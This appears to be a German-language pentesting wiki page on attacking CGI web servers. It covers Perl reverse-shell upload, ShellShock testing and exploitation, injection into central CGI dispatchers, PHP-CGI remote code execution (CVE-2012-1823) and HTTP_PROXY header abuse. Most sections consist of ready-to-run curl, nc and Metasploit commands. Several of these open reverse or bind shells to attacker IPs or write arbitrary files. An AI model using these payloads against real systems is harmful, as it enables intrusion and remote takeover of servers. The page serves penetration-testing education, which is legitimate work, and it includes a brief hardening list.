# CGI Pentesting

{{#include ../../banners/hacktricks-training.md}}


## Informationen

Die **CGI-Skripte sind Perl-Skripte**, daher kannst du, wenn du einen Server kompromittiert hast, der _**.cgi**_ Skripte ausführen kann, eine **perl reverse shell** hochladen (`/usr/share/webshells/perl/perl-reverse-shell.pl`), die **Erweiterung** von **.pl** zu **.cgi** ändern, **Ausführungsrechte** (`chmod +x`) setzen und die Reverse-Shell **vom Webbrowser aus** aufrufen, um sie auszuführen.
Um auf **CGI vulns** zu testen, wird empfohlen `nikto -C all` \(und alle Plugins\) zu verwenden.

## **ShellShock**

**ShellShock** ist eine **Schwachstelle**, die die weit verbreitete **Bash** Kommandozeile in Unix-basierten Betriebssystemen betrifft. Sie zielt auf die Fähigkeit von Bash ab, Befehle auszuführen, die von Anwendungen übergeben werden. Die Schwachstelle liegt in der Manipulation von **Umgebungsvariablen**, das sind dynamische benannte Werte, die beeinflussen, wie Prozesse auf einem Rechner laufen. Angreifer können dies ausnutzen, indem sie **bösartigen Code** an Umgebungsvariablen anhängen, der beim Empfangen der Variable ausgeführt wird. Dadurch können Angreifer potenziell das System kompromittieren.

Beim Ausnutzen dieser Schwachstelle könnte die Seite einen Fehler ausgeben.

Du könntest diese Schwachstelle finden, indem du bemerkst, dass eine alte **Apache**-Version und **cgi_mod** \(mit einem cgi-Ordner\) verwendet werden, oder indem du **nikto** einsetzt.

### **Test**

Die meisten Tests basieren darauf, etwas zu echoen und zu erwarten, dass diese Zeichenkette in der Web-Antwort zurückkommt. Wenn du denkst, dass eine Seite verwundbar sein könnte, suche alle **cgi**-Seiten und teste sie.

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(reflected, blind und out-of-band\)**
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
### Exploit
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
## Zentralisierte CGI-Dispatcher (Routing eines einzelnen Endpunkts über Selector-Parameter)

Viele embedded Web-UIs bündeln Dutzende privilegierter Aktionen hinter einem einzelnen CGI-Endpunkt (zum Beispiel `/cgi-bin/cstecgi.cgi`) und verwenden einen Selector-Parameter wie `topicurl=<handler>`, um die Anfrage an eine interne Funktion zu routen.

Vorgehensweise zur Ausnutzung dieser Router:

- Enumerate handler names: JS/HTML scrapen, mit wordlists brute-forcen oder Firmware entpacken und mit grep nach Handler-Strings suchen, die vom Dispatcher verwendet werden.
- Test unauthenticated reachability: einige Handler vergessen auth-Checks und sind direkt aufrufbar.
- Focus on handlers that invoke system utilities or touch files; schwache Validatoren blockieren oft nur wenige Zeichen und übersehen möglicherweise das führende `-`.

Generische Exploit-Muster:
```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# 1) Option/flag injection (no shell metacharacters): flip argv of downstream tools
topicurl=<handler>&param=-n

# 2) Parameter-to-shell injection (classic RCE) when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;

# 3) Validator bypass → arbitrary file write in file-touching handlers
topicurl=setWizardCfg&<crafted_fields>=/etc/init.d/S99rc
```
Erkennung und Härtung:

- Achte auf unauthentifizierte Requests an zentralisierte CGI-Endpunkte, bei denen `topicurl` auf sensitive Handler gesetzt ist.
- Markiere Parameter, die mit `-` beginnen (argv option injection attempts).
- Vendors: erzwinge Authentifizierung für alle zustandsverändernden Handler, validiere mittels strikten Allowlists/Typen/Längen und übergib niemals von Benutzern kontrollierte Strings als Kommandozeilen-Flags.

## Altes PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

Grundsätzlich: wenn CGI aktiv ist und PHP "alt" \(&lt;5.3.12 / &lt; 5.4.2\), kannst du Code ausführen.
Um diese Schwachstelle auszunutzen, musst du auf eine PHP-Datei des Webservers zugreifen, ohne Parameter zu senden \(insbesondere ohne das Zeichen "="\).
Um die Schwachstelle zu testen, könntest du zum Beispiel `/index.php?-s` aufrufen \(achte auf das `-s`\) und **der Quellcode der Anwendung wird in der Antwort erscheinen**.

Um dann **RCE** zu erlangen, kannst du diese spezielle Anfrage senden: `/?-d allow_url_include=1 -d auto_prepend_file=php://input` und der **PHP code** wird im **body of the request** ausgeführt.
Beispiel:
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**Mehr Infos über die vuln und möglichen exploits:** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF Writeup Example**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**

## **Proxy \(MitM to Web server requests\)**

CGI legt für jeden header in der http request eine Umgebungsvariable an. Zum Beispiel: "host:web.com" wird zu "HTTP_HOST"="web.com"

Da die HTTP_PROXY-Variable vom Webserver verwendet werden könnte, versuche einen **header** zu senden, der folgendes enthält: "**Proxy: &lt;IP_attacker&gt;:&lt;PORT&gt;**". Führt der Server während der Session eine Anfrage aus, kannst du jede vom Server ausgeführte Anfrage abfangen.

## **Referenzen**

- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../../banners/hacktricks-training.md}}
